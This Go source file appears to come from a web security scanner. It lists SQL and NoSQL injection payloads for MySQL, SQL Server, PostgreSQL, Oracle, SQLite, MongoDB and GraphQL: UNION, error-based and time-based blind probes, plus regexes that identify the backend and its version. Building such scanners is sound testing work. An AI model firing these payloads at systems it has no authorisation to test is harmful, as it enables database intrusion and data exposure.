package runner

import "regexp"

// dbEngine describes how to identify one database backend across three
// techniques: UNION-based (version reflected in the page, wrapped in a marker),
// error-based (version in a reflected error), and blind time-based (an
// engine-specific delay function).
type dbEngine struct {
	name          string
	unionPayloads []string       // UNION SELECT that reflects ~~version~~ in the body
	payloads      []string       // error/version-leak payloads (need the error reflected)
	sleepPayloads []string       // engine-specific delay payloads (%d = seconds) for blind ID
	boolProbe     string         // a boolean expression whose SYNTAX is valid only on this engine
	boolTrue      string         // behavioral boolean pair (e.g. NoSQL): TRUE payload
	boolFalse     string         // behavioral boolean pair: FALSE payload
	versionRE     *regexp.Regexp // captures the version in group 1 from an error (optional)
	detectRE      *regexp.Regexp // confirms the engine from the response (optional)
}

// unionMarker wraps a UNION-reflected version so it can be told apart from
// version-looking numbers already on the page.
var unionMarkerRE = regexp.MustCompile(`~~([^~]{1,200})~~`)

// dbEngines is tried in order. The payloads are injected as a parameter/field
// value.
var dbEngines = []dbEngine{
	{
		name: "MySQL/MariaDB",
		unionPayloads: []string{
			"' UNION SELECT concat(0x7e7e,@@version,0x7e7e)-- -",
			"' UNION SELECT concat(0x7e7e,@@version,0x7e7e),NULL-- -",
			"' UNION SELECT NULL,concat(0x7e7e,@@version,0x7e7e)-- -",
			"' UNION SELECT concat(0x7e7e,@@version,0x7e7e),NULL,NULL-- -",
			"' UNION SELECT NULL,concat(0x7e7e,@@version,0x7e7e),NULL-- -",
		},
		payloads: []string{
			"' AND extractvalue(1,concat(0x7e,version()))-- -",
			"' AND updatexml(1,concat(0x7e,version()),1)-- -",
		},
		sleepPayloads: []string{
			"' AND SLEEP(%d)-- -",
			"' OR SLEEP(%d)-- -",
			"' AND (SELECT SLEEP(%d))-- -",
			"'||(SELECT SLEEP(%d))||'",
		},
		boolProbe: `@@version_comment LIKE '%'`,
		versionRE: regexp.MustCompile(`(?i)~?([0-9]+\.[0-9]+\.[0-9]+[-\w]*)`),
		detectRE:  regexp.MustCompile(`(?i)XPATH syntax error|SQL syntax.*MySQL|valid MySQL result|MariaDB`),
	},
	{
		name: "Microsoft SQL Server",
		unionPayloads: []string{
			"' UNION SELECT CHAR(126)+CHAR(126)+@@version+CHAR(126)+CHAR(126)-- -",
			"' UNION SELECT CHAR(126)+CHAR(126)+@@version+CHAR(126)+CHAR(126),NULL-- -",
			"' UNION SELECT NULL,CHAR(126)+CHAR(126)+@@version+CHAR(126)+CHAR(126)-- -",
			"' UNION SELECT CHAR(126)+CHAR(126)+@@version+CHAR(126)+CHAR(126),NULL,NULL-- -",
		},
		payloads: []string{
			"' AND 1=CONVERT(int,@@version)-- -",
			"' AND 1=CAST(@@version AS int)-- -",
		},
		sleepPayloads: []string{
			"'; WAITFOR DELAY '0:0:%d'-- -",
			"' WAITFOR DELAY '0:0:%d'-- -",
		},
		boolProbe: `@@SPID=@@SPID`,
		versionRE: regexp.MustCompile(`(?i)(Microsoft SQL Server[ -]*[0-9]{4}[^'\n<]{0,40})`),
		detectRE:  regexp.MustCompile(`(?i)SQL Server|Conversion failed|OLE DB Provider|Unclosed quotation mark`),
	},
	{
		name: "PostgreSQL",
		unionPayloads: []string{
			"' UNION SELECT chr(126)||chr(126)||version()||chr(126)||chr(126)-- -",
			"' UNION SELECT chr(126)||chr(126)||version()||chr(126)||chr(126),NULL-- -",
			"' UNION SELECT NULL,chr(126)||chr(126)||version()||chr(126)||chr(126)-- -",
		},
		payloads: []string{
			"' AND 1=CAST(version() AS int)-- -",
			"' AND 1=(SELECT version())::int-- -",
		},
		sleepPayloads: []string{
			"' AND (SELECT 1 FROM pg_sleep(%d)) IS NOT NULL-- -",
			"'||(SELECT pg_sleep(%d))::text||'",
			"'; SELECT pg_sleep(%d)-- -",
		},
		boolProbe: `(SELECT 1 FROM pg_catalog.pg_tables LIMIT 1)=1`,
		versionRE: regexp.MustCompile(`(?i)(PostgreSQL[ ]*[0-9.]+[^'\n<]{0,30})`),
		detectRE:  regexp.MustCompile(`(?i)PostgreSQL|pg_|invalid input syntax|unterminated quoted`),
	},
	{
		name: "Oracle",
		unionPayloads: []string{
			"' UNION SELECT chr(126)||chr(126)||banner||chr(126)||chr(126) FROM v$version WHERE rownum=1-- -",
			"' UNION SELECT chr(126)||chr(126)||banner||chr(126)||chr(126),NULL FROM v$version WHERE rownum=1-- -",
			"' UNION SELECT NULL,chr(126)||chr(126)||banner||chr(126)||chr(126) FROM v$version WHERE rownum=1-- -",
		},
		payloads: []string{
			"' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))-- -",
			"' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -",
		},
		sleepPayloads: []string{
			"' AND 1=(SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',%d)=1)-- -",
			"'||dbms_pipe.receive_message(CHR(65),%d)||'",
		},
		boolProbe: `(SELECT 1 FROM v$version WHERE rownum=1)=1`,
		versionRE: regexp.MustCompile(`(?i)(Oracle Database[^'\n<]{0,40}|Release [0-9.]+)`),
		detectRE:  regexp.MustCompile(`(?i)\bORA-[0-9]{5}\b|Oracle error|quoted string not properly terminated`),
	},
	{
		name: "SQLite",
		unionPayloads: []string{
			"' UNION SELECT char(126)||char(126)||sqlite_version()||char(126)||char(126)-- -",
			"' UNION SELECT char(126)||char(126)||sqlite_version()||char(126)||char(126),NULL-- -",
			"' UNION SELECT NULL,char(126)||char(126)||sqlite_version()||char(126)||char(126)-- -",
		},
		payloads: []string{
			"' AND 1=load_extension(char(66))-- -",
		},
		boolProbe: `(SELECT 1 FROM sqlite_master LIMIT 1)=1`,
		detectRE:  regexp.MustCompile(`(?i)SQLite|unrecognized token|no such (function|table|column)|not authorized`),
	},
	{
		name: "MongoDB",
		payloads: []string{
			"'||'1'=='1",
			"';return(true);var x='",
			"' && this.password && '",
		},
		// NoSQL boolean differential: ||'1'=='1' makes the filter always true
		// (returns everything), while '1'=='2' does not — a behavioral signal that
		// works even when no Mongo error is reflected.
		boolTrue:  "'||'1'=='1",
		boolFalse: "'||'1'=='2",
		detectRE:  regexp.MustCompile(`(?i)MongoError|E11000|BSON|\$where|SyntaxError:|unterminated string|MongoDB`),
	},
	{
		name: "GraphQL",
		payloads: []string{
			"'",
			"\"",
		},
		detectRE: regexp.MustCompile(`(?i)GraphQL|Cannot query field|__typename|must be of type|Syntax Error: Unexpected|graphql-`),
	},
}
